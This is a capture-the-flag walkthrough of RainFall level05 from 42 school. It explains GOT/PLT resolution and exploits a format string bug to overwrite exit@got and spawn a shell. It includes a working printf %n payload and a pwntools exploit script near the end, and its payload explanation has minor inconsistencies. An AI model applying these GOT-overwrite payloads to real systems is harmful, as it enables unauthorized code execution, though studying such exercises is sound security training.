---
title: 42 RainFall Level05 - Walkthrough 🚀
tags:
  - cyber-security
  - rainfall
  - assembly
  - ctf
  - format-string
  - vulnerability
  - got
categories:
  - ctfs
  - 42project
date: 2025-03-03 22:31:02
---

# Welcome to RainFall

![rainfall](/images/rainfall.jpg)

# 🌊 Level05 of Rainfall Project (Overwrite the GOT with format string) 🌊

## 🔍 Introduction

Hello, today I'm gonna show you the level 5 of the rainfall project from 42 school.

### 🔍 Quick view of the binary

To begin with, we'll run the `file` command to determine the file type and format.

So you can run the following command

```sh
$ file ./level05
```

normally, you should get a output like this

```sh
level5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb3518ed7ddb097b6f8a23a49fad17a792ae35d8, not stripped
```

We can see that this is an ELF 32-bit binary with x86 architecture (Intel 80386).  
We can also see that the binary is dynamically linked and that the interpreter is located in `/lib/ld-linux.so.2`, and that the code has been compiled under Linux with kernel 2.6.24.  

We can use the `readelf` command to retrieve a little more information about the binary.


```sh
readelf -h ./level5
```

```sh
En-tête ELF:
  Magique:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Classe:                            ELF32
  Données:                          complément à 2, système à octets de poids faible d'abord (little endian)
  Version:                           1 (actuelle)
  OS/ABI:                            UNIX - System V
  Version ABI:                       0
  Type:                              EXEC (fichier exécutable)
  Machine:                           Intel 80386
  Version:                           0x1
  Adresse du point d'entrée:         0x80483f0
  Début des en-têtes de programme :  52 (octets dans le fichier)
  Début des en-têtes de section :    2416 (octets dans le fichier)
  Fanions:                           0x0
  Taille de cet en-tête:             52 (octets)
  Taille de l'en-tête du programme:  32 (octets)
  Nombre d'en-tête du programme:     8
  Taille des en-têtes de section:    40 (octets)
  Nombre d'en-têtes de section:      30
  Table d'index des chaînes d'en-tête de section: 27
```

You should see something like this.

Now, let's take a deeper dive into the binary. We can use tools such as `objdump` or `nm` to list the available symbols. Additionally, we can run `strings` to extract readable text from the binary.

For my part, I'll go straight to debugging by opening it in `gdb` with the **GEF** extension.


```sh
gdb ./level5
```

A binary consists of different sections that work together to ensure its functionality. This becomes even more interesting when the binary is **dynamically linked**, as ours is.  

I'll revisit this point later.

If you run the following command in `gdb`:


```gdb
info file
```

You Should have something like this

```python
Symbols from "/home/sam0verfl0w/repos/RainFall/level5/Ressources/level5".
Local exec file:
	`/home/sam0verfl0w/repos/RainFall/level5/Ressources/level5', file type elf32-i386.
	Entry point: 0x80483f0
	0x08048134 - 0x08048147 is .interp
	0x08048148 - 0x08048168 is .note.ABI-tag
	0x08048168 - 0x0804818c is .note.gnu.build-id
	0x0804818c - 0x080481b0 is .gnu.hash
	0x080481b0 - 0x08048250 is .dynsym
	0x08048250 - 0x080482b5 is .dynstr
	0x080482b6 - 0x080482ca is .gnu.version
	0x080482cc - 0x080482ec is .gnu.version_r
	0x080482ec - 0x080482fc is .rel.dyn
	0x080482fc - 0x08048334 is .rel.plt
	0x08048334 - 0x08048362 is .init
	0x08048370 - 0x080483f0 is .plt
	0x080483f0 - 0x080485cc is .text
	0x080485cc - 0x080485e6 is .fini
	0x080485e8 - 0x080485f8 is .rodata
	0x080485f8 - 0x0804863c is .eh_frame_hdr
	0x0804863c - 0x08048738 is .eh_frame
	0x08049738 - 0x08049740 is .ctors
	0x08049740 - 0x08049748 is .dtors
	0x08049748 - 0x0804974c is .jcr
	0x0804974c - 0x08049814 is .dynamic
	0x08049814 - 0x08049818 is .got
	0x08049818 - 0x08049840 is .got.plt
	0x08049840 - 0x08049848 is .data
	0x08049848 - 0x08049858 is .bss
```

#### ✨ Quick view of ELF (Executable Linkable Format) file format

As you can see, we can view the different sections of the binary.  

For example, the **.text** section contains the processor opcodes that the CPU will execute.  
We also have other sections, such as:  

- **.rodata** – Contains strings or data that are accessible in read-only mode.  
- **.bss** – Stores variables that were not initialized at compile time.  

Additionally, there are sections responsible for loading and launching the binary into memory, such as:  

- **.interp**, **.dynamic**, **.dynsym**, **.dynstr**  
- **.plt**, **.got**, **.rel.dyn**, **.rel.plt**, **.got.plt**  

I'll go into more detail about these later.  

For now, let's disassemble the binary and analyze how the program works.  

If you run the following command in `gdb`:  

```gdb
info functions
```

```gdb
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf@plt
0x08048390  _exit@plt
0x080483a0  fgets@plt
0x080483b0  system@plt
0x080483c0  __gmon_start__@plt
0x080483d0  exit@plt
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

if we disassemble the main function with this command

```gdb
disas main
```

You should have something like this

```gdb
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
```

We notice that our `main` function makes a call to the function `n`.  

If we disassemble it, we can analyze its behavior.

```gdb
disas n
```

```gdb
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:	    mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

We notice several things in this code.  

The first important detail I forgot to mention is that in **32-bit** architecture, the calling convention relies on the **stack**, which operates in **LIFO (Last In, First Out)** order. This means that the last value pushed onto the stack will be the first one to be popped.  

On **x86_64** architectures, however, the standard calling convention typically uses **register passing** instead of the stack.  

You can explore the different calling conventions in more detail here:  
[🔗 x86 Calling Conventions](https://en.wikipedia.org/wiki/X86_calling_conventions)

#### Identify the vulnerability

```sh
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:	    mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
```

If we go back to this piece of code, we can see that after the **function prologue**, a small amount of space is allocated on the stack—specifically **0x218** in hexadecimal (**536 bytes**).  

We also notice a call to the **`fgets`** function.  

After executing `sub rsp, 0x218`, the processor loads a value from a specific address in the **data segment** (**ds**).  

If we use the following command in `gdb`:  

```gdb
x/x <address_from_data_segment>
```

We can observe the value stored at that address.

```sh
0x8049848 <stdin@@GLIBC_2.0>:	0x00000000
```

Remember `0` is **STDIN**, `1` is **STDOUT**, `2` is **STDERR**

We can see that this address points to **libc's `stdin` symbol**, which serves as the last parameter of our `fgets` function. This value will be loaded onto the stack at the last position, **`[esp+0x8]`**.  

### 🧪 Understanding the `fgets` Call

Without even running the program, we now know that **`fgets` takes user input**—pretty cool!  
If we continue analyzing the code, we notice that:  

- At **`esp+0x4`**, the program requests **0x200 bytes** (512 bytes in decimal) to be read.  
- The instruction **`lea` (Load Effective Address)** retrieves the address stored at **`ebp - 0x208`**, which is the **starting address of our buffer**.  
- This buffer is then placed at the **top of the stack**, completing the setup for the `fgets` function call.  

### ☣️  The Developer's Critical Mistake  

What follows is **a disaster**—the developer has made a serious vulnerability!  

- The return value of `fgets` is stored in the **`eax` register**, meaning `eax` holds a pointer to our input buffer.  
- The problem? **This buffer is passed directly to `printf` without specifying a format string!**  
- The function then ends with a call to `exit(1)`, terminating the program via a system exit call.  

### 😎 Exploiting the Vulnerability  

If you haven’t figured it out yet, this vulnerability is known as a **format string vulnerability**.  
This means we **can manipulate memory** by crafting specific inputs.  

Let’s put it to the test!

If you run the program and enter **`%x`** as input, you'll notice that we can **read values directly from the stack**.  

Even though we understand the **potential** of this vulnerability, we still need to figure out **how to exploit it effectively**.  

To do that, let's go back to our **list of functions**—there’s still **one function** we haven't explored yet.  

If we disassemble o function ?

```gdb
0x080484a4 <+0>:	push   ebp
0x080484a5 <+1>:	mov    ebp,esp
0x080484a7 <+3>:	sub    esp,0x18
0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
0x080484b1 <+13>:	call   0x80483b0 <system@plt>
0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
0x080484bd <+25>:	call   0x8048390 <_exit@plt>
```

We see that this function **calls the `system` function** with a string as an argument.  

If we run the following command in `gdb`:  

```sh
gef➤  x/s 0x80485f0
0x80485f0:	"/bin/sh"
```

### 💡 Exploiting the Format String Vulnerability  

Great! We now know that the **`o` function** executes a shell.  
However, **this function is never called** in the normal execution flow—so how can we **force the program to call it** using our **format string vulnerability**?  

At this point, we could run **`checksec`** to analyze the binary’s protections, but that won’t help much.  
We could also use **`nm`** to inspect symbols and variables, but we've already determined that **there are no global variables being checked or executed**.  

### 💡 Enter GOT and PLT

This is where we introduce **GOT (Global Offset Table) and PLT (Procedure Linkage Table)**—key concepts for dynamically linked binaries.  

- **GOT (Global Offset Table):**  
  A table containing addresses of functions **resolved at runtime**, allowing dynamically linked libraries (like `libc`) to be used efficiently.  

- **PLT (Procedure Linkage Table):**  
  A mechanism used to **indirectly call functions** in shared libraries. When a function is called for the first time, PLT redirects it to the GOT for resolution.  

Understanding how these work will allow us to **redirect execution** and exploit our format string vulnerability to **force the execution of `o()`**, giving us a shell.  

## 💡 Understanding GOT and PLT  

### **GOT (Global Offset Table)**  

The **Global Offset Table (GOT)** is a **section in an ELF binary** that helps resolve memory addresses **dynamically** at runtime.  

It is crucial for **Position Independent Code (PIC)** and **Position Independent Executables (PIE)**, which are designed to be **loaded at different memory addresses** each time the program runs.  

- Since the absolute memory addresses of **variables and functions** are **unknown** before execution, the GOT helps **map symbols to their corresponding memory addresses** at runtime.  
- This allows **shared libraries (`.so` files)** to be loaded at **arbitrary addresses**, avoiding **conflicts** with the main program or other libraries.  
- The GOT is represented in the **`.got` and `.got.plt`** sections of an ELF file.  
- The **dynamic linker** updates GOT entries at program startup or when specific symbols are accessed.  
- This mechanism also provides **security benefits**, making it harder for attackers to exploit hardcoded addresses in binaries.  

### **PLT (Procedure Linkage Table)**  

While the **GOT resolves data symbols**, the **Procedure Linkage Table (PLT)** is responsible for **resolving function calls**.  

- Since the **linker cannot resolve function calls** between different dynamically linked objects at compile time, it sets up a **PLT entry** for each external function.  
- The **first time a function is called**, execution is redirected through the **PLT**, which then **resolves the function’s actual address** via the GOT.  
- This enables **position-independent function calls** without compromising **binary portability or shareability**.  
- Both **executables and shared libraries** have their own **PLT sections** to manage this process.  

Understanding **GOT and PLT** will be key to **redirecting execution flow** and **exploiting format string vulnerabilities** in dynamically linked binaries.  

```sh
$ objdump -d level5 -M intel -j .plt
```

you should have something like this

```
level5:     format de fichier elf32-i386


Déassemblage de la section .plt :

08048370 <.plt>:
 8048370:	ff 35 1c 98 04 08    	push   DWORD PTR ds:0x804981c
 8048376:	ff 25 20 98 04 08    	jmp    DWORD PTR ds:0x8049820
 804837c:	00 00                	add    BYTE PTR [eax],al
	...

08048380 <printf@plt>:
 8048380:	ff 25 24 98 04 08    	jmp    DWORD PTR ds:0x8049824
 8048386:	68 00 00 00 00       	push   0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <.plt>

08048390 <_exit@plt>:
 8048390:	ff 25 28 98 04 08    	jmp    DWORD PTR ds:0x8049828
 8048396:	68 08 00 00 00       	push   0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <.plt>

080483a0 <fgets@plt>:
 80483a0:	ff 25 2c 98 04 08    	jmp    DWORD PTR ds:0x804982c
 80483a6:	68 10 00 00 00       	push   0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <.plt>

080483b0 <system@plt>:
 80483b0:	ff 25 30 98 04 08    	jmp    DWORD PTR ds:0x8049830
 80483b6:	68 18 00 00 00       	push   0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <.plt>

080483c0 <__gmon_start__@plt>:
 80483c0:	ff 25 34 98 04 08    	jmp    DWORD PTR ds:0x8049834
 80483c6:	68 20 00 00 00       	push   0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <.plt>

080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
 80483d6:	68 28 00 00 00       	push   0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <.plt>

080483e0 <__libc_start_main@plt>:
 80483e0:	ff 25 3c 98 04 08    	jmp    DWORD PTR ds:0x804983c
 80483e6:	68 30 00 00 00       	push   0x30
 80483eb:	e9 80 ff ff ff       	jmp    8048370 <.plt>
 ```

 ## Understanding PLT Stubs and Function Resolution in a Dynamically Linked Binary  

Each symbol in the **Procedure Linkage Table (PLT)**, like `mysymbol@PLT`, corresponds to a **PLT stub**.  
A **stub** is a small **executable code snippet** that serves as an intermediary for dynamic function calls.  

### **PLT Stub Characteristics**  

- Each **PLT stub** is **aligned to 16 bytes** for **optimization** and **predictability**.  
- The **.plt section** contains **all function stubs** for dynamically linked functions.  

### **Execution Flow in a Dynamically Linked Binary**  

1. When the binary starts, execution begins at the `_start` symbol.  
2. `_start` calls `libc_start_main`, which in turn calls the `main` function.  
3. Inside `main`, when a function like `puts` is called, the CPU **jumps to the corresponding PLT stub**.  
4. The **PLT stub** then:  
   - Looks for the function address in the **Global Offset Table (GOT)**.  
   - If the function is already resolved, it jumps directly to it (e.g., `puts` in **libc**).  
   - If not, the **stub pushes the GOT entry onto the stack** and calls the **dynamic linker** to resolve it.  
5. The **dynamic linker** finds the correct function, writes its address to the **GOT**, and execution continues.  

### **Example with a Simple Binary**  

To analyze this, we can compile a basic dynamically linked binary and disassemble its **PLT and GOT** using tools like `objdump` and `readelf`.  

```c
// gcc example.c -o example -m32 -fno-stack-protector -no-pie -z execstack
// warning: If you use gcc version greater than 12 the following options are added and the got and plt is already writted.
#include <stdio.h>

int main(void)
{
    puts("hello");
    puts("world");
    return (0);
}
```

we're going to compile this program in 32 bits to respect the same calling convention etc... and understand how got and plt work with what I said above.
we'll open our binary with gdb GEF or peda as you like, then place a breakpoint at the main function's input.

We can also put a breakpoint before puts calls.
once launched, we can do a first continue in order to arrive before puts call.

```gdb
run
c
```

once here, we can run the GOT command, which will allow us to see the puts address in our GOT

```gdb
got
```

you should have something like this.

```gdb
gef➤  got

GOT protection: Partial RelRO | GOT functions: 2
 
[0x804c000] __libc_start_main@GLIBC_2.34  →  0xf7c20b30
[0x804c004] puts@GLIBC_2.0  →  0x8049046
```

So you can see that we've found our `puts`, but if we look at where it's pointing, you'll notice that it's not the actual symbol of the `puts` function.  

If we examine the GOT entry for `puts`, we can verify this behavior:  

```gdb
x/gx &puts
```

You'll notice that this address redirects us to the PLT section instead of the actual `puts` function. But why?  

The reason is simple: the `puts` symbol hasn't yet been resolved for the first time. The PLT acts as an intermediary to handle function resolution dynamically.  

### Investigating the Resolution Process  

To observe this in action, we can disassemble the GOT entry:  

```gdb
x/i *(puts@got)
```

This will show that the GOT entry initially points to the corresponding PLT stub. Now, let's step into the call and see how it works:  

```gdb
b *puts@plt
run
si
```

By stepping through the instructions, we'll see that:  

1. The call jumps to the PLT stub.  
2. If the function hasn't been resolved, the stub triggers a dynamic linker call.  
3. The linker resolves the actual address of `puts` in the shared library (`libc`).  
4. The resolved address is written to the GOT, so future calls bypass the PLT stub.  

Once the function has been resolved, subsequent calls to `puts` will directly use the resolved address in the GOT, avoiding additional linker overhead.  

Now that we understand how PLT and GOT work, we can leverage this knowledge for exploitation techniques such as function hijacking or ret2plt attacks! 🚀  

```gdb
si
```

```gdb
0x8049040 <puts@plt+0>     jmp    DWORD PTR ds:0x804c004
0x8049046 <puts@plt+6>     push   0x8
0x804904b <puts@plt+11>    jmp    0x8049020
```

The first line you see is the location in the got of the PLT symbol if we do an x/x there, we find the following line because, as I explained earlier, the function hasn't yet been resolved.

```gdb
gef➤  x/x 0x804c004
0x804c004 <puts@got.plt>:	0x08049046
```
### Stepping Through the PLT Resolution  

As you can see, the address pointed to by the data segment is `0x804c004`.

This address corresponds to the following entry in the GOT.  

To observe how the PLT resolves function calls, we can step through the execution.  

```gdb
ni
```

This will execute the next instruction and allow the PLT to do its work. As the execution progresses, we will see how the dynamic linker finds the real address of the function and updates the GOT entry accordingly.  

By stepping through carefully, we can analyze:  
- The transition from the PLT stub to the dynamic linker.  
- The moment when the actual function address is resolved.  
- How subsequent calls to the function skip the PLT and use the resolved address directly from the GOT.  

This understanding is crucial for analyzing binary exploitation techniques, such as GOT overwrite attacks or ret2plt exploits. 🚀  

Once this is done, you can see that we're pushing an integer into each stub here it's 8 this entry corresponds to the index in the GOT of the puts function.

then the cpu will simply push this argument onto the stack, since in 32-bit x86 the argument is passed via the stack.

so we are once again executing a ni.

```gdb
ni
```
as you can see, our 8 is now at the top of our stack the next instruction is a jump, but where to? we'll see right away.

if we x/i the address we're going to jump to, we can see that it's the entry to the plt section

```gdb
0x8049020                  push   DWORD PTR ds:0x804bff8
0x8049026                  jmp    DWORD PTR ds:0x804bffc
```

### Dynamic Linker Resolution  

The place where we jump to `0x804bffc` is the dynamic linker entry point.  

Once inside the dynamic linker function, it will:  
- Load the `libc` if it hasn't been loaded yet.  
- Locate the corresponding `puts` symbol.  
- Write the resolved address to the GOT.  

Without delving into the specifics of how the linker works (which will be covered in another tutorial), we finally land at the actual `puts` function:  

```gdb
0xf7c74c80 <puts+0>         endbr32 
0xf7c74c84 <puts+4>         push   ebp
0xf7c74c85 <puts+5>         mov    ebp, esp
0xf7c74c87 <puts+7>         push   edi
0xf7c74c88 <puts+8>         call   0xf7d75a03
0xf7c74c8d <puts+13>        add    edi, 0x1ab19f
```

At this point, if we check the GOT, we can see that the linker has updated it. The address of the `puts` symbol has now been resolved:  

```gdb
gef➤  got

GOT protection: Partial RelRO | GOT functions: 2
 
[0x804c000] __libc_start_main@GLIBC_2.34  →  0xf7c20b30
[0x804c004] puts@GLIBC_2.0  →  0xf7c74c80
```

If we take this new address and examine its context, we can analyze the resolution process further. 🚀  

```sh
gef➤  fa 0xf7c74c80
[+] Current progspace /home/sam0verfl0w/repos/RainFall/level5/Ressources/example
[+] 0xf7c74c80 Found  at /usr/lib32/libc.so.6
```

### Function Resolution in `libc`

We can see that the function is now correctly resolved, and it is present in `libc`.

Super! 🎉 Now that we understand how the PLT and GOT work, let's take it a step further.

If we progress further in the program and call this function again later, what happens? 🤔  

### Continuing Execution and Function Resolution in `libc`

We continue execution with:

```gdb
c
```

We've stopped once again at the next `puts` call, which will simply execute `puts("world");`.  

Let's step into the instruction like before and observe how the PLT behaves:

```gdb
si
```

```gdb
0x8049040 <puts@plt+0>     jmp    DWORD PTR ds:0x804c004
0x8049046 <puts@plt+6>     push   0x8
0x804904b <puts@plt+11>    jmp    0x8049020
```

We still see our usual PLT stub. However, if we check the GOT address, as observed earlier, it directly jumps to `libc`'s `puts` function since it has already been resolved once during the program's execution.

```gdb
gef➤  x/x 0x804c004
0x804c004 <puts@got.plt>:	0xf7c74c80
```

Since the function address is now stored in the GOT, execution directly transfers to `libc`'s `puts` function without passing through the PLT again.

```gdb
gef➤  x/i 0xf7c74c80
0xf7c74c80 <puts+0>         endbr32 
0xf7c74c84 <puts+4>         push   ebp
0xf7c74c85 <puts+5>         mov    ebp, esp
0xf7c74c87 <puts+7>         push   edi
0xf7c74c88 <puts+8>         call   0xf7d75a03
0xf7c74c8d <puts+13>        add    edi, 0x1ab19f
```

Now, `puts` is fully resolved and directly accessed from `libc`. 🚀

### Overwriting the GOT to Gain Control  

Now that we understand how GOT and PLT work, we can leverage a format string vulnerability to overwrite the GOT entry of a function and redirect execution to our shell-spawning function.

#### Inspecting the GOT  

Let's return to our Level 5 binary, set a breakpoint on `main`, and inspect the GOT:  

```gdb
gef➤  got

GOT protection: No RelRO | GOT functions: 7
 
[0x8049824] printf@GLIBC_2.0  →  0x8048386
[0x8049828] _exit@GLIBC_2.0  →  0x8048396
[0x804982c] fgets@GLIBC_2.0  →  0x80483a6
[0x8049830] system@GLIBC_2.0  →  0x80483b6
[0x8049834] __gmon_start__  →  0x80483c6
[0x8049838] exit@GLIBC_2.0  →  0x80483d6
[0x804983c] __libc_start_main@GLIBC_2.0  →  0xf7c20b30
```

Since there's **no RelRO protection**, the GOT is writable, making it possible to overwrite function pointers.

**RelRO**: Protection to make a GOT section in read-only.

🚀 Next, we will craft an exploit using a format string vulnerability to modify a GOT entry and redirect execution to a function that executes a shell.  

### Understanding the Initial State of the GOT  

At the beginning of program execution, you should observe something like this:  

- No function or symbol (except for `__libc_start_main`) has been resolved yet.  
- This is because functions are only resolved once they are called at least once.  
- `__libc_start_main` is an exception since it is invoked from the `_start` symbol during program initialization.  

### Choosing a Target for GOT Overwrite  

To overwrite a GOT entry, we need to select a suitable function.  
However, we cannot target `fgets` because we still need it for input handling.  

🤔 **So, what can we do?**  

If we analyze the function calls in the binary, we might find a candidate that allows us to gain control—perhaps a function like `exit` or another suitable stub.  

🛠️ Next step: Let's reassemble and inspect function calls (`call` instructions) to determine a viable target for GOT overwrite.  

### Disassembling Function `n`  

To analyze potential targets for GOT overwrite, let's disassemble the function `n`:  

```gdb
gef➤  disassemble n
Dump of assembler code for function n:
   0x080484c2 <+0>:   push   ebp
   0x080484c3 <+1>:   mov    ebp,esp
   0x080484c5 <+3>:   sub    esp,0x218
   0x080484cb <+9>:   mov    eax,ds:0x8049848
   0x080484d0 <+14>:  mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:  mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:  lea    eax,[ebp-0x208]
   0x080484e2 <+32>:  mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:  call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:  lea    eax,[ebp-0x208]
   0x080484f0 <+46>:  mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:  call   0x8048380 <printf@plt>
   0x080484f8 <+54>:  mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:  call   0x80483d0 <exit@plt>
End of assembler dump.
```

### Observations  

- `n` calls three functions:  
  - `fgets@plt` at `0x080484e5`  
  - `printf@plt` at `0x080484f3`  
  - `exit@plt` at `0x080484ff`  

- The function `exit@plt` (`0x080483d0`) is a good candidate for GOT overwrite.  
- By replacing `exit` with `system`, we can make the program execute an arbitrary command when it calls `exit()`.  

### Next Steps  

We'll attempt to overwrite `exit@got.plt` with the address of `system` to gain execution control. 🚀  

```sh
❯ ./level5
AAAA %x %x %x %x
AAAA 200 efe205c0 0 41414141
```
Great! now that we know where our buffer is on the stack, all we have to do is replace the A's with a valid address - you've got it right, the address of the exit symbol's entry in the got and we're going to rewrite it at the location pointed to by the exit symbol, which will enable us to change the exit address in the got

if we do an objdump and retrieve the address of the got in the PLT exit@PLT stub, you should have this address if the binary is dynamically linked but not PIE, so you should have the same addresses.


```shell
$ objdump -d ./level5 -M intel -j .plt

Déassemblage de la section .plt :

08048370 <.plt>:
 8048370:	ff 35 1c 98 04 08    	push   DWORD PTR ds:0x804981c
 8048376:	ff 25 20 98 04 08    	jmp    DWORD PTR ds:0x8049820
 804837c:	00 00                	add    BYTE PTR [eax],al
	...

08048380 <printf@plt>:
 8048380:	ff 25 24 98 04 08    	jmp    DWORD PTR ds:0x8049824
 8048386:	68 00 00 00 00       	push   0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <.plt>

08048390 <_exit@plt>:
 8048390:	ff 25 28 98 04 08    	jmp    DWORD PTR ds:0x8049828
 8048396:	68 08 00 00 00       	push   0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <.plt>

080483a0 <fgets@plt>:
 80483a0:	ff 25 2c 98 04 08    	jmp    DWORD PTR ds:0x804982c
 80483a6:	68 10 00 00 00       	push   0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <.plt>

080483b0 <system@plt>:
 80483b0:	ff 25 30 98 04 08    	jmp    DWORD PTR ds:0x8049830
 80483b6:	68 18 00 00 00       	push   0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <.plt>

080483c0 <__gmon_start__@plt>:
 80483c0:	ff 25 34 98 04 08    	jmp    DWORD PTR ds:0x8049834
 80483c6:	68 20 00 00 00       	push   0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <.plt>

080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
 80483d6:	68 28 00 00 00       	push   0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <.plt>

080483e0 <__libc_start_main@plt>:
 80483e0:	ff 25 3c 98 04 08    	jmp    DWORD PTR ds:0x804983c
 80483e6:	68 30 00 00 00       	push   0x30
 80483eb:	e9 80 ff ff ff       	jmp    8048370 <.plt>
```
as you can see, our address is the one present in the data segment at 0x8049838.

So we can now rewrite, I'm going to create a payload first with python3 and finish with a little pwntools script so I can pwn it directly.

so first here's my payload,
all we have to do is write the address of the exit entry in the got in little endian, 
as memory is in little endian on x86 and x86-64 cpu architectures.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*4 + b'%4\$p')" | ./level5
```
In little endian, the following address 0x8049838 gives \x38\x98\x04\x08

so now we can write our payload and check if what we say is true, right?

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'\x38\x98\x04\x08' + b'%4\$p')" | ./level5
```

if we run our payload on our binary normally if everything has worked correctly you should have this

```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'\x38\x98\x04\x08' + b'%4\$p')" | ./level5
0x8049838
```

so you can see that our address is correctly written in the order we want.
In the final step, we simply replace the %p by a %n, which allows us to rewrite to the address we've set on the stack.
the address of the o function is 0x080484a4 so we'll have to write 0x080484a4 - 4 bytes in number of characters to be able to jump to our o function when exit@PLT is called.

The final payload is here

```sh
(python3 -c "import sys; sys.stdout.buffer.write(b'\x38\x98\x04\x08' + b'%33788c%4\$hn%164c%4\$hhn')";/bin/cat) | ./level5
```

we first write 0x84 using the hn option the hn option writes on 2 bytes then we finish with the other part of the address we're missing: 0xa4 we write but this time with the hn option which writes on the least significant byte and we add a cat just after to preserve the shell state so we can execute our commands.

Super you got your shell to rewrite the address of the got of exit every time the function is called it will execute the one you rewrote which means that exit can never be resolved.

I provide you with a script written with pwntools to facilitate your task pwntools allows you to quickly pwn programs etc..

```python
#!/usr/bin/python3
#coding: utf-8

import sys

try:
    from pwn import *
except ImportError as err:
    print(err)
    sys.exit(1)

class LoadBinary:

    def __init__(self, binary, mode):
        context.update(arch='i386', os='linux')

        self.filename = binary
        self.elf = ELF(binary)
        if mode == "-l":
            self.p = process(binary)
        elif mode == "-r":
            self.client = ssh("level5", '192.168.42.72', port=4242, password="XXXXX")
            self.p = self.client.process('./level5')
        else:
            print("Invalid options dude !")

    def run(self):
        got_exit = self.elf.got['exit']
        o_func = self.elf.symbols['o']
        print('[+] Overwrite _exit@PLT at {} with {}'.format(hex(got_exit), hex(o_func)))

        payload = fmtstr_payload(4, {got_exit: o_func})
        print(payload)
        self.p.sendline(payload)
        self.p.interactive()
        self.p.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
    LoadBinary(sys.argv[2], sys.argv[1]).run()
```
